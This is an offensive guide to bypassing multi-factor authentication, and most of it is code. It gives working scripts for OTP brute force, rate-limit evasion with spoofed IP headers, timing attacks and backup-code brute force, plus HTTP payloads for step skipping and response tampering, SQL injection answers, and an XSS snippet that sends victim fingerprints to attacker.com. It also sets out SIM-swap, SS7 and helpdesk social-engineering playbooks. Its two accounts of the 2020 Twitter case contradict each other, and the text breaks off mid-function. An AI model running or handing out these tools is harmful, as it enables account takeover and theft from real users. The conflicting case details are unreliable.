# Multi-Factor Authentication (MFA) Bypass Techniques

## Overview

Multi-Factor Authentication adds security layers beyond passwords but contains numerous bypass vectors. This document covers comprehensive MFA bypass methodologies for security testing.

---

## 1. Direct Bypass Techniques

### 1.1 Direct Request to Authenticated Endpoint

**Concept**: Skip MFA entirely by directly accessing post-authentication resources.

**Testing Method**:
```http
# Step 1: Complete initial login (username/password)
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "victim", "password": "password123"}

# Response includes session token before MFA
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Step 2: Skip MFA, directly access authenticated endpoint
GET /api/dashboard HTTP/1.1
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Burp Suite Automation**:
```python
# Burp Extension - MFA Skip Scanner
def passive_scan(request, response):
    if "mfa" in response.body.lower() or "2fa" in response.body.lower():
        # Flag as MFA checkpoint
        issue = CustomIssue(
            "MFA Checkpoint Detected",
            "Test direct endpoint access bypassing this step"
        )
        return [issue]
```

**Real-World Case Study** (HackerOne #879682):
> Instagram MFA bypass via direct API access. After initial login, accessing `/api/v1/accounts/current_user/` returned full user data without MFA completion. Bounty: $15,000

---

### 1.2 Step Skipping / Forced Browsing

**Concept**: Manipulate the authentication flow to skip MFA verification step.

**Testing Payloads**:
```http
# Method 1: Direct navigation after password
GET /account/dashboard HTTP/1.1
Cookie: auth_step=password_verified

# Method 2: Modify step parameter
POST /api/auth/verify HTTP/1.1
Content-Type: application/json

{"step": "complete", "skip_mfa": true}

# Method 3: Modify flow state
POST /auth/continue HTTP/1.1
Content-Type: application/json

{"auth_state": "authenticated", "mfa_required": false}
```

**Automated Testing Script**:
```python
#!/usr/bin/env python3
"""MFA Step Skipper - Test forced browsing bypasses"""

import requests

class MFAStepSkipper:
    def __init__(self, base_url, session):
        self.base_url = base_url
        self.session = session
        self.authenticated_endpoints = [
            '/dashboard', '/api/user', '/account/settings',
            '/admin', '/api/v1/me', '/profile', '/home'
        ]

    def test_direct_access(self, cookies):
        """Test direct access to authenticated endpoints"""
        results = []
        for endpoint in self.authenticated_endpoints:
            try:
                resp = self.session.get(
                    f"{self.base_url}{endpoint}",
                    cookies=cookies,
                    allow_redirects=False
                )
                if resp.status_code == 200:
                    results.append({
                        'endpoint': endpoint,
                        'status': 'VULNERABLE',
                        'response_length': len(resp.text)
                    })
                elif resp.status_code in [301, 302]:
                    location = resp.headers.get('Location', '')
                    if 'mfa' not in location.lower() and '2fa' not in location.lower():
                        results.append({
                            'endpoint': endpoint,
                            'status': 'POTENTIAL_BYPASS',
                            'redirect': location
                        })
            except Exception as e:
                pass
        return results

    def test_step_manipulation(self, cookies):
        """Test authentication step manipulation"""
        step_payloads = [
            {"step": "3", "mfa_verified": "true"},
            {"auth_complete": "1"},
            {"skip_2fa": "true"},
            {"mfa_status": "verified"},
            {"authentication_level": "full"}
        ]

        results = []
        for payload in step_payloads:
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/auth/verify",
                    json=payload,
                    cookies=cookies
                )
                if resp.status_code == 200 and 'error' not in resp.text.lower():
                    results.append({
                        'payload': payload,
                        'status': 'POTENTIAL_BYPASS'
                    })
            except:
                pass
        return results

# Usage
if __name__ == "__main__":
    skipper = MFAStepSkipper("https://target.com", requests.Session())
    # After password auth, capture cookies
    cookies = {"session": "captured_session_token"}
    print(skipper.test_direct_access(cookies))
```

---

### 1.3 Response Manipulation

**Concept**: Modify server responses to trick the application into believing MFA was completed.

**Testing Methods**:

```http
# Original MFA verification response (failed)
HTTP/1.1 200 OK
{"success": false, "mfa_verified": false, "error": "Invalid code"}

# Modified response (intercepted with Burp)
HTTP/1.1 200 OK
{"success": true, "mfa_verified": true, "redirect": "/dashboard"}
```

**Burp Suite Match/Replace Rules**:
```
# Match and Replace - Response body
Match: "mfa_verified":false
Replace: "mfa_verified":true

Match: "success":false
Replace: "success":true

Match: "2fa_required":true
Replace: "2fa_required":false

Match: "authentication_complete":false
Replace: "authentication_complete":true
```

**Client-Side Bypass Detection**:
```javascript
// Check for client-side MFA validation
// In browser console after failed MFA attempt:
localStorage.setItem('mfa_verified', 'true');
sessionStorage.setItem('auth_complete', 'true');
document.cookie = "mfa_status=verified";

// Force navigation
window.location.href = '/dashboard';
```

**Real-World Case Study** (Bugcrowd):
> Grammarly MFA bypass via response manipulation. Changing `"2fa_required": true` to `false` in login response granted full access. Bounty: $5,000

---

### 1.4 Forced Browsing with State Manipulation

**Testing Payloads**:
```http
# Manipulate authentication state cookie
GET /dashboard HTTP/1.1
Cookie: session=abc123; auth_state=fully_authenticated; mfa_complete=1

# Header manipulation
GET /api/user HTTP/1.1
X-Auth-Status: verified
X-MFA-Bypass: true
X-Skip-2FA: 1

# Query parameter injection
GET /dashboard?mfa_verified=true&skip_2fa=1 HTTP/1.1
```

---

## 2. OTP (One-Time Password) Attacks

### 2.1 OTP Brute Force

**Concept**: Systematically try all possible OTP codes (typically 6-digit = 1,000,000 combinations).

**Brute Force Script**:
```python
#!/usr/bin/env python3
"""OTP Brute Force Tool"""

import requests
import threading
from queue import Queue
import time

class OTPBruteForcer:
    def __init__(self, target_url, session_cookie, threads=50):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.threads = threads
        self.found = False
        self.attempts = 0
        self.queue = Queue()

    def generate_codes(self, length=6):
        """Generate all possible OTP codes"""
        for i in range(10**length):
            self.queue.put(str(i).zfill(length))

    def try_code(self):
        """Worker thread to try OTP codes"""
        while not self.queue.empty() and not self.found:
            code = self.queue.get()
            try:
                resp = requests.post(
                    self.target_url,
                    json={"otp": code},
                    cookies={"session": self.session_cookie},
                    timeout=5
                )
                self.attempts += 1

                if resp.status_code == 200 and "success" in resp.text.lower():
                    print(f"[+] VALID CODE FOUND: {code}")
                    self.found = True
                    return code

                if self.attempts % 1000 == 0:
                    print(f"[*] Attempted {self.attempts} codes...")

            except requests.exceptions.RequestException:
                self.queue.put(code)  # Retry
            finally:
                self.queue.task_done()

    def run(self):
        """Execute brute force attack"""
        print(f"[*] Starting OTP brute force with {self.threads} threads")
        self.generate_codes()

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.try_code)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        return self.found

# Usage
bruteforcer = OTPBruteForcer(
    "https://target.com/api/verify-otp",
    "session_token_here",
    threads=100
)
bruteforcer.run()
```

**Hydra Command**:
```bash
# OTP brute force with Hydra
hydra -l user@example.com -P otp_wordlist.txt target.com https-post-form \
  "/api/verify-otp:otp=^PASS^:Invalid code"

# Generate 6-digit OTP wordlist
seq -w 000000 999999 > otp_wordlist.txt
```

---

### 2.2 Rate Limiting Bypass

**Techniques and Payloads**:

```http
# Method 1: IP Rotation Headers
POST /api/verify-otp HTTP/1.1
X-Forwarded-For: 192.168.1.{RANDOM}
X-Real-IP: 10.0.0.{RANDOM}
X-Originating-IP: 172.16.0.{RANDOM}
X-Client-IP: 8.8.8.{RANDOM}
True-Client-IP: 1.1.1.{RANDOM}
CF-Connecting-IP: 9.9.9.{RANDOM}

{"otp": "123456"}

# Method 2: Case variation (if email-based)
POST /api/verify-otp HTTP/1.1
{"email": "User@Example.COM", "otp": "123456"}
{"email": "user@example.com", "otp": "123457"}
{"email": "USER@example.com", "otp": "123458"}

# Method 3: Null byte / whitespace injection
{"otp": "123456"}
{"otp": " 123456"}
{"otp": "123456 "}
{"otp": "123456\x00"}
{"otp": "123456\n"}

# Method 4: Array notation
{"otp": ["123456"]}
{"otp[]": "123456"}

# Method 5: Different content types
Content-Type: application/json
{"otp": "123456"}

Content-Type: application/x-www-form-urlencoded
otp=123456

Content-Type: multipart/form-data
otp=123456

# Method 6: HTTP method variation
POST /api/verify-otp HTTP/1.1
PUT /api/verify-otp HTTP/1.1
PATCH /api/verify-otp HTTP/1.1
```

**Rate Limit Bypass Script**:
```python
#!/usr/bin/env python3
"""Rate Limit Bypass for OTP Brute Force"""

import requests
import random

class RateLimitBypass:
    def __init__(self, target_url):
        self.target_url = target_url
        self.ip_headers = [
            'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
            'X-Client-IP', 'True-Client-IP', 'CF-Connecting-IP',
            'X-Forwarded', 'Forwarded-For', 'X-Remote-IP',
            'X-Remote-Addr', 'X-ProxyUser-Ip', 'X-Original-URL',
            'Client-IP', 'X-Cluster-Client-IP', 'Fastly-Client-IP'
        ]

    def generate_random_ip(self):
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def get_bypass_headers(self):
        headers = {}
        for header in self.ip_headers:
            headers[header] = self.generate_random_ip()
        return headers

    def try_otp_with_bypass(self, otp, session_cookie):
        headers = self.get_bypass_headers()
        headers['User-Agent'] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}"

        variations = [
            {"otp": otp},
            {"otp": f" {otp}"},
            {"otp": f"{otp} "},
            {"otp": [otp]},
            {"code": otp},
            {"verification_code": otp}
        ]

        for payload in variations:
            try:
                resp = requests.post(
                    self.target_url,
                    json=payload,
                    headers=headers,
                    cookies={"session": session_cookie}
                )
                if "rate limit" not in resp.text.lower():
                    return resp
            except:
                continue
        return None
```

**Real-World Case Study** (HackerOne #1139549):
> Microsoft MFA bypass via rate limit evasion using X-Forwarded-For rotation. Allowed unlimited OTP attempts. Bounty: $13,000

---

### 2.3 OTP Reuse Attack

**Concept**: Valid OTPs may be accepted multiple times or after expiration.

**Testing Method**:
```python
#!/usr/bin/env python3
"""OTP Reuse Tester"""

import requests
import time

class OTPReuseTester:
    def __init__(self, target_url, session_cookie):
        self.target_url = target_url
        self.session_cookie = session_cookie

    def test_reuse(self, valid_otp):
        """Test if OTP can be reused"""
        results = []

        # First use (should succeed)
        resp1 = requests.post(
            self.target_url,
            json={"otp": valid_otp},
            cookies={"session": self.session_cookie}
        )
        results.append(("First use", resp1.status_code, "success" in resp1.text.lower()))

        # Second use immediately
        resp2 = requests.post(
            self.target_url,
            json={"otp": valid_otp},
            cookies={"session": self.session_cookie}
        )
        results.append(("Immediate reuse", resp2.status_code, "success" in resp2.text.lower()))

        # Test after delays
        for delay in [30, 60, 120, 300]:
            time.sleep(delay)
            resp = requests.post(
                self.target_url,
                json={"otp": valid_otp},
                cookies={"session": self.session_cookie}
            )
            results.append((f"After {delay}s", resp.status_code, "success" in resp.text.lower()))

        return results

    def test_different_account(self, valid_otp, other_session):
        """Test if OTP works on different account"""
        resp = requests.post(
            self.target_url,
            json={"otp": valid_otp},
            cookies={"session": other_session}
        )
        return ("Cross-account use", resp.status_code, "success" in resp.text.lower())
```

---

### 2.4 OTP Leakage in Response

**Testing Areas**:
```http
# Check response headers
HTTP/1.1 200 OK
X-OTP-Code: 123456
X-Debug-Token: 123456
X-Verification-Code: 123456

# Check response body
{"message": "OTP sent", "debug": {"code": "123456"}}
{"status": "pending", "otp_hint": "123***"}

# Check cookies
Set-Cookie: pending_otp=123456
Set-Cookie: verification_token=base64(otp)

# Check JavaScript files
var expectedOTP = "123456";
if (userInput === expectedOTP) { ... }

# Check WebSocket messages
{"type": "otp_generated", "code": "123456"}

# Check API verbose errors
{"error": "Invalid OTP. Expected: 123456, Got: 000000"}
```

**Automated Leakage Scanner**:
```python
#!/usr/bin/env python3
"""OTP Leakage Scanner"""

import requests
import re
import json
import base64

class OTPLeakageScanner:
    def __init__(self):
        self.otp_patterns = [
            r'(?:otp|code|token|pin|verification)["\s:=]+["\s]*(\d{4,8})',
            r'(\d{6})',  # Generic 6-digit
            r'(?:expected|correct|valid)["\s:]+["\s]*(\d{4,8})',
        ]

    def scan_response(self, response):
        """Scan HTTP response for OTP leakage"""
        leaks = []

        # Check headers
        for header, value in response.headers.items():
            header_lower = header.lower()
            if any(x in header_lower for x in ['otp', 'code', 'token', 'verify', 'debug']):
                leaks.append({
                    'location': 'header',
                    'header': header,
                    'value': value
                })

        # Check body
        body = response.text
        for pattern in self.otp_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            for match in matches:
                leaks.append({
                    'location': 'body',
                    'pattern': pattern,
                    'value': match
                })

        # Check cookies
        for cookie in response.cookies:
            if any(x in cookie.name.lower() for x in ['otp', 'code', 'token', 'verify']):
                # Try to decode
                try:
                    decoded = base64.b64decode(cookie.value).decode()
                except:
                    decoded = cookie.value
                leaks.append({
                    'location': 'cookie',
                    'name': cookie.name,
                    'value': decoded
                })

        return leaks

    def scan_js_files(self, js_urls):
        """Scan JavaScript files for hardcoded OTPs"""
        leaks = []
        for url in js_urls:
            try:
                resp = requests.get(url)
                for pattern in self.otp_patterns:
                    matches = re.findall(pattern, resp.text)
                    for match in matches:
                        leaks.append({
                            'location': 'javascript',
                            'file': url,
                            'value': match
                        })
            except:
                pass
        return leaks
```

**Real-World Case Study** (HackerOne #810857):
> Shopify exposed OTP in JSON response during email verification. `{"otp_sent": true, "code": "847291"}`. Bounty: $2,500

---

### 2.5 OTP Timing Attacks

**Concept**: Exploit timing differences in OTP validation to infer correct digits.

```python
#!/usr/bin/env python3
"""OTP Timing Attack"""

import requests
import time
import statistics

class OTPTimingAttack:
    def __init__(self, target_url, session_cookie, samples=10):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.samples = samples

    def measure_response_time(self, otp):
        """Measure response time for OTP verification"""
        times = []
        for _ in range(self.samples):
            start = time.perf_counter()
            requests.post(
                self.target_url,
                json={"otp": otp},
                cookies={"session": self.session_cookie}
            )
            end = time.perf_counter()
            times.append(end - start)
        return statistics.mean(times)

    def attack_digit_by_digit(self, length=6):
        """Attempt timing attack digit by digit"""
        discovered = ""

        for position in range(length):
            best_digit = None
            best_time = 0

            for digit in range(10):
                test_otp = discovered + str(digit) + "0" * (length - position - 1)
                avg_time = self.measure_response_time(test_otp)
                print(f"Testing {test_otp}: {avg_time:.4f}s")

                if avg_time > best_time:
                    best_time = avg_time
                    best_digit = str(digit)

            discovered += best_digit
            print(f"[+] Discovered so far: {discovered}")

        return discovered
```

---

### 2.6 OTP Generation Weakness

**Testing for Weak PRNG**:
```python
#!/usr/bin/env python3
"""OTP Generation Weakness Detector"""

import requests
import time
from collections import Counter

class OTPGenerationAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.collected_otps = []

    def request_otps(self, email, count=100):
        """Request multiple OTPs and analyze patterns"""
        for i in range(count):
            # Request new OTP
            requests.post(
                f"{self.target_url}/api/send-otp",
                json={"email": email}
            )
            # If OTP is exposed (via email API, response, etc.)
            # collect it here
            time.sleep(1)

    def analyze_patterns(self, otps):
        """Analyze collected OTPs for weaknesses"""
        analysis = {
            'sequential': self.check_sequential(otps),
            'time_based': self.check_time_based(otps),
            'weak_entropy': self.check_entropy(otps),
            'repeating': self.check_repeating(otps)
        }
        return analysis

    def check_sequential(self, otps):
        """Check for sequential OTP generation"""
        int_otps = [int(x) for x in otps]
        diffs = [int_otps[i+1] - int_otps[i] for i in range(len(int_otps)-1)]
        if len(set(diffs)) == 1:
            return {"vulnerable": True, "increment": diffs[0]}
        return {"vulnerable": False}

    def check_time_based(self, otps):
        """Check if OTP is derived from timestamp"""
        # Compare with TOTP algorithm
        import hashlib
        import hmac
        import struct

        current_time = int(time.time())
        for offset in range(-30, 31):
            timestamp = current_time + offset
            counter = timestamp // 30
            # Test common seeds
            for seed in [b'12345678901234567890', b'secret', b'default']:
                hmac_hash = hmac.new(seed, struct.pack('>Q', counter), hashlib.sha1).digest()
                offset_byte = hmac_hash[-1] & 0x0f
                code = struct.unpack('>I', hmac_hash[offset_byte:offset_byte+4])[0]
                code = (code & 0x7fffffff) % 1000000
                if str(code).zfill(6) in otps:
                    return {"vulnerable": True, "seed": seed.decode(), "offset": offset}
        return {"vulnerable": False}

    def check_entropy(self, otps):
        """Check for low entropy in OTP generation"""
        digit_freq = Counter(''.join(otps))
        # If certain digits appear much more frequently
        total = sum(digit_freq.values())
        for digit, count in digit_freq.items():
            freq = count / total
            if freq > 0.15:  # Expected ~10% for uniform distribution
                return {"vulnerable": True, "biased_digit": digit, "frequency": freq}
        return {"vulnerable": False}

    def check_repeating(self, otps):
        """Check for OTP reuse/repetition"""
        freq = Counter(otps)
        repeated = {otp: count for otp, count in freq.items() if count > 1}
        if repeated:
            return {"vulnerable": True, "repeated": repeated}
        return {"vulnerable": False}
```

---

## 3. SMS-Based MFA Attacks

### 3.1 SIM Swapping

**Attack Flow**:
1. Attacker gathers victim's personal information (social engineering, OSINT)
2. Contacts victim's mobile carrier impersonating victim
3. Convinces carrier to transfer phone number to attacker's SIM
4. Receives all SMS messages including MFA codes

**Information Gathering for SIM Swap**:
```bash
# OSINT for victim information
# theHarvester - Email, name, phone enumeration
theHarvester -d target.com -b all

# Social media reconnaissance
sherlock <username>

# Phone number lookup
phoneinfoga scan -n +1XXXXXXXXXX

# Data breach search for personal details
h8mail -t victim@email.com
```

**Carrier-Specific Vulnerabilities**:
```
# Common carrier verification questions:
- Last 4 of SSN
- Billing ZIP code
- Account PIN (often default or easily guessable)
- Recent payment amount
- Device IMEI (leaked in breaches)
```

**Real-World Case Study** (Twitter Hack 2020):
> High-profile Twitter accounts compromised via SIM swapping. Attackers convinced T-Mobile to transfer numbers, bypassing Twitter's SMS 2FA.

---

### 3.2 SS7 Protocol Attacks

**Concept**: Exploit vulnerabilities in the SS7 (Signaling System 7) telecom protocol to intercept SMS messages.

**SS7 Attack Vectors**:
```
# SS7 Message Types for SMS Interception:

1. SendRoutingInfoForSM (SRI-SM)
   - Query victim's MSISDN to get IMSI
   - Get current serving MSC/VLR address

2. UpdateLocation
   - Register attacker's equipment as victim's serving MSC
   - All SMS routed to attacker

3. MT-ForwardSM
   - Forward SMS meant for victim to attacker
```

**SS7 Attack Tool Usage** (For authorized security testing):
```python
#!/usr/bin/env python3
"""SS7 SMS Interception Simulator (Educational)"""

# Note: Actual SS7 attacks require specialized equipment
# and telecom access. This demonstrates the concept.

class SS7AttackSimulator:
    """
    SS7 attack demonstration - NOT for malicious use
    Requires authorized access to SS7 network
    """

    def __init__(self):
        self.sri_sm_template = {
            'operation': 'sendRoutingInfoForSM',
            'msisdn': None,  # Target phone number
            'sm_rp_pri': True,
            'serviceCentreAddress': None
        }

        self.update_location_template = {
            'operation': 'updateLocation',
            'imsi': None,  # From SRI-SM response
            'msc_number': None,  # Attacker's MSC
            'vlr_number': None   # Attacker's VLR
        }

    def get_routing_info(self, target_msisdn):
        """
        Step 1: Send SRI-SM to get victim's IMSI and serving network
        """
        print(f"[*] Sending SRI-SM for {target_msisdn}")
        # Would send actual SS7 message here
        return {
            'imsi': '310260000000000',
            'msc': '+12025551234',
            'vlr': '+12025554321'
        }

    def register_fake_msc(self, imsi, fake_msc):
        """
        Step 2: Register attacker's MSC as victim's serving network
        """
        print(f"[*] Registering fake MSC {fake_msc} for IMSI {imsi}")
        # Would send UpdateLocation here
        return True

    def intercept_sms(self):
        """
        Step 3: Receive SMS messages destined for victim
        """
        print("[*] Waiting for incoming SMS...")
        # SMS would arrive at attacker's equipment
        return {
            'sender': 'VERIFY',
            'message': 'Your verification code is: 123456'
        }
```

**Mitigation Detection**:
```python
# Test if application uses SMS-based 2FA (vulnerable to SS7)
def check_sms_2fa_vulnerability(target_url):
    """Check if target uses vulnerable SMS-based 2FA"""
    response = requests.get(f"{target_url}/api/auth/mfa-options")

    mfa_options = response.json()
    vulnerabilities = []

    if 'sms' in mfa_options.get('available_methods', []):
        vulnerabilities.append({
            'type': 'SMS_2FA',
            'risk': 'HIGH',
            'attacks': ['SIM_SWAP', 'SS7', 'SMS_INTERCEPTION']
        })

    if 'voice_call' in mfa_options.get('available_methods', []):
        vulnerabilities.append({
            'type': 'VOICE_2FA',
            'risk': 'HIGH',
            'attacks': ['VOICEMAIL', 'CALL_FORWARDING', 'SS7']
        })

    return vulnerabilities
```

---

### 3.3 SMS Interception Methods

**Voicemail Exploitation**:
```python
#!/usr/bin/env python3
"""Voicemail MFA Bypass"""

import requests

class VoicemailExploit:
    """
    Exploit voicemail to capture voice-based OTP
    Works when:
    1. User's phone goes to voicemail (call during busy/off)
    2. Voicemail has weak/default PIN
    3. OTP is read out as voice message
    """

    def __init__(self):
        # Common default voicemail PINs
        self.default_pins = [
            '0000', '1234', '1111', '9999',
            '0123', '4321', '5555', '6666',
            # Last 4 digits of phone number
            # Birth year (1990, 1985, etc.)
        ]

    def attempt_voicemail_access(self, carrier_voicemail_number, target_pin):
        """
        Attempt to access voicemail with PIN
        Carrier voicemail numbers:
        - Verizon: *86
        - AT&T: *98 or 1-800-288-2020
        - T-Mobile: 1-805-637-7249
        """
        # Would use telephony API to dial and enter PIN
        pass

    def trigger_voicemail(self, target_number, otp_service_number):
        """
        Ensure call goes to voicemail by:
        1. Calling target simultaneously from multiple lines
        2. Triggering OTP request when line is busy
        """
        pass
```

**Real-World Case Study**:
> Reddit employee accounts compromised (2018) via SMS intercept. Attackers bypassed SMS 2FA using SIM swap, accessing employee accounts and user data.

---

### 3.4 Phone Number Manipulation

**Testing Payloads**:
```http
# International format variations
POST /api/send-otp HTTP/1.1
{"phone": "+1-555-123-4567"}
{"phone": "+15551234567"}
{"phone": "15551234567"}
{"phone": "555-123-4567"}
{"phone": "(555) 123-4567"}
{"phone": "5551234567"}

# Unicode/encoding tricks
{"phone": "+1\u200B555\u200B1234567"}  # Zero-width space
{"phone": "+1 555 123 4567\x00"}  # Null byte
{"phone": "tel:+15551234567"}  # URI scheme

# Parameter pollution
{"phone": "+15551234567", "phone": "+1ATTACKERNUM"}

# Attacker number injection
{"phone": "+15551234567,+1ATTACKERNUM"}
{"phone": "+15551234567;+1ATTACKERNUM"}

# Country code manipulation
{"phone": "015551234567"}  # Interpreted differently by carriers
{"phone": "+1(0)5551234567"}
```

---

## 4. Recovery Mechanism Attacks

### 4.1 Backup Code Brute Force

**Attack Script**:
```python
#!/usr/bin/env python3
"""Backup Code Brute Forcer"""

import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

class BackupCodeBruteForcer:
    def __init__(self, target_url, session_cookie):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.found = False

    def generate_codes(self, format_type):
        """Generate backup codes based on common formats"""
        if format_type == 'numeric_8':
            # 8-digit numeric (Google style)
            return (str(i).zfill(8) for i in range(10**8))
        elif format_type == 'alphanumeric_8':
            # 8-char alphanumeric (XXXX-XXXX)
            chars = string.ascii_lowercase + string.digits
            return (''.join(p) for p in itertools.product(chars, repeat=8))
        elif format_type == 'hex_16':
            # 16-char hex (GitHub style)
            return ('%016x' % i for i in range(16**16))
        elif format_type == 'word_based':
            # Word-based codes (common wordlist)
            words = ['apple', 'banana', 'cherry', ...]  # Load wordlist
            return ('-'.join(p) for p in itertools.product(words, repeat=4))

    def try_code(self, code):
        """Attempt backup code authentication"""
        if self.found:
            return None

        # Format code (add dashes if needed)
        formatted = f"{code[:4]}-{code[4:]}" if len(code) == 8 else code

        try:
            resp = requests.post(
                self.target_url,
                json={"backup_code": formatted},
                cookies={"session": self.session_cookie},
                timeout=5
            )

            if "success" in resp.text.lower() or resp.status_code == 200:
                self.found = True
                return code
        except:
            pass
        return None

    def run(self, format_type='numeric_8', threads=50):
        """Execute brute force"""
        codes = self.generate_codes(format_type)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for result in executor.map(self.try_code, codes):
                if result:
                    print(f"[+] VALID BACKUP CODE: {result}")
                    return result
        return None
```

---

### 4.2 Recovery Email Takeover

**Attack Vectors**:
```
1. Recovery Email Enumeration
   - Test password reset to identify recovery email
   - Often shows hints: "sent to j***@g***.com"

2. Recovery Email Vulnerabilities
   - Expired domain registration (buy domain, receive emails)
   - Email provider vulnerabilities
   - Password reset chain attack

3. Recovery Email Manipulation
```

**Testing Payloads**:
```http
# Try to change recovery email without full auth
POST /api/account/recovery-email HTTP/1.1
Authorization: Bearer <partial_auth_token>

{"recovery_email": "attacker@evil.com"}

# Parameter pollution
POST /api/account/recovery HTTP/1.1
{"email": "victim@example.com", "recovery_email": "attacker@evil.com"}

# Recovery flow manipulation
POST /api/recover HTTP/1.1
{"email": "victim@example.com", "send_to": "attacker@evil.com"}
```

---

### 4.3 Security Question Bypass

**Common Weak Questions**:
```
# Easily researchable via OSINT:
- What is your mother's maiden name? (Public records, social media)
- What city were you born in? (LinkedIn, Facebook)
- What was the name of your first pet? (Social media posts)
- What high school did you attend? (LinkedIn, Facebook)
- What is your favorite movie? (Social media, reviews)
```

**Testing Payloads**:
```http
# Empty/null answers
{"security_answer": ""}
{"security_answer": null}
{"security_answer": " "}

# Case sensitivity bypass
{"security_answer": "FLUFFY"}
{"security_answer": "fluffy"}
{"security_answer": "Fluffy"}

# SQL injection in answers
{"security_answer": "' OR '1'='1"}
{"security_answer": "x' OR 1=1--"}

# Common answers wordlist
fluffy
spot
max
buddy
123456
password
iloveyou
abc123
```

**OSINT Automation for Security Questions**:
```python
#!/usr/bin/env python3
"""Security Question OSINT Gatherer"""

import requests
from bs4 import BeautifulSoup

class SecurityQuestionOSINT:
    def __init__(self, target_name):
        self.target = target_name
        self.findings = {
            'hometown': [],
            'school': [],
            'pet_names': [],
            'maiden_names': [],
            'favorite_things': []
        }

    def search_social_media(self):
        """Search social media for security question answers"""
        # Would integrate with social media APIs
        pass

    def search_public_records(self):
        """Search public records for family information"""
        # Birth records, marriage records, etc.
        pass

    def generate_answer_wordlist(self):
        """Generate targeted wordlist from findings"""
        wordlist = []
        for category, values in self.findings.items():
            for value in values:
                # Add variations
                wordlist.append(value)
                wordlist.append(value.lower())
                wordlist.append(value.upper())
                wordlist.append(value.title())
        return list(set(wordlist))
```

---

### 4.4 Social Engineering Recovery

**Helpdesk Bypass Techniques**:
```
1. Impersonation
   - Gather personal info via OSINT
   - Call helpdesk as "victim"
   - Request MFA reset due to "lost phone"

2. Urgency/Authority
   - Claim to be executive with urgent access need
   - Reference fake incident/emergency

3. Technical Confusion
   - Claim app shows wrong phone number
   - Request "temporary" MFA bypass
```

**Real-World Case Study** (Twitter 2020):
> Attackers called Twitter employees, impersonated IT department, obtained VPN credentials, then used internal tools to reset MFA on high-profile accounts.

---

## 5. Token and Device Trust Attacks

### 5.1 Session Cookie Reuse Post-MFA

**Concept**: Use cookies/tokens obtained after MFA on different devices or after MFA should expire.

**Testing Method**:
```python
#!/usr/bin/env python3
"""Post-MFA Session Reuse Tester"""

import requests
import time

class SessionReuseTester:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_session_binding(self, session_cookie, auth_token):
        """Test if session is bound to device/IP"""
        tests = []

        # Test 1: Different IP (use proxy)
        proxies = {'http': 'http://proxy:8080', 'https': 'http://proxy:8080'}
        resp = requests.get(
            f"{self.base_url}/api/user",
            cookies={"session": session_cookie},
            headers={"Authorization": f"Bearer {auth_token}"},
            proxies=proxies
        )
        tests.append({
            'test': 'Different IP',
            'vulnerable': resp.status_code == 200
        })

        # Test 2: Different User-Agent
        resp = requests.get(
            f"{self.base_url}/api/user",
            cookies={"session": session_cookie},
            headers={
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": "DifferentBrowser/1.0"
            }
        )
        tests.append({
            'test': 'Different User-Agent',
            'vulnerable': resp.status_code == 200
        })

        # Test 3: After MFA timeout
        time.sleep(3600)  # Wait 1 hour
        resp = requests.get(
            f"{self.base_url}/api/user",
            cookies={"session": session_cookie},
            headers={"Authorization": f"Bearer {auth_token}"}
        )
        tests.append({
            'test': 'After timeout',
            'vulnerable': resp.status_code == 200
        })

        return tests

    def test_token_extraction(self, session_cookie):
        """Test if auth tokens can be extracted from cookies"""
        # Check if JWT or similar is in cookie
        try:
            import base64
            import json

            parts = session_cookie.split('.')
            if len(parts) == 3:  # Looks like JWT
                payload = base64.b64decode(parts[1] + '==')
                data = json.loads(payload)
                return {
                    'type': 'JWT',
                    'payload': data,
                    'vulnerable': 'mfa' not in str(data).lower()
                }
        except:
            pass
        return None
```

---

### 5.2 Remember Device Manipulation

**Testing Payloads**:
```http
# Manipulate device trust cookie
Cookie: device_trusted=true; device_id=attacker_device_id

# Manipulate device fingerprint
POST /api/auth/login HTTP/1.1
{
    "username": "victim",
    "password": "password",
    "device_fingerprint": "stolen_fingerprint_hash",
    "remember_device": true
}

# Steal and replay device token
Cookie: remember_token=victim_remember_token_from_XSS

# Bypass device verification
POST /api/verify-device HTTP/1.1
{
    "device_id": "any_id",
    "verified": true,
    "skip_verification": true
}
```

**Device Fingerprint Bypass**:
```javascript
// Capture device fingerprint from victim (via XSS)
const fingerprint = await Fingerprint2.get();
// Send to attacker server
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(fingerprint)
});

// Use stolen fingerprint to bypass device trust
// Inject fingerprint values into login request
```

---

### 5.3 Device Fingerprint Spoofing

```python
#!/usr/bin/env python3
"""Device Fingerprint Spoofing"""

import requests
import hashlib
import json

class DeviceFingerprintSpoofer:
    def __init__(self):
        self.common_fingerprints = []

    def generate_fingerprint(self, params):
        """Generate a device fingerprint"""
        fp_data = {
            'userAgent': params.get('ua', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
            'language': params.get('lang', 'en-US'),
            'colorDepth': params.get('depth', 24),
            'screenResolution': params.get('res', [1920, 1080]),
            'timezone': params.get('tz', -420),
            'sessionStorage': True,
            'localStorage': True,
            'indexedDb': True,
            'cpuClass': params.get('cpu', 'unknown'),
            'platform': params.get('platform', 'Win32'),
            'plugins': params.get('plugins', []),
            'canvas': params.get('canvas', 'canvas_hash'),
            'webgl': params.get('webgl', 'webgl_hash'),
            'audio': params.get('audio', 'audio_hash')
        }

        # Generate hash like FingerprintJS
        fp_string = json.dumps(fp_data, sort_keys=True)
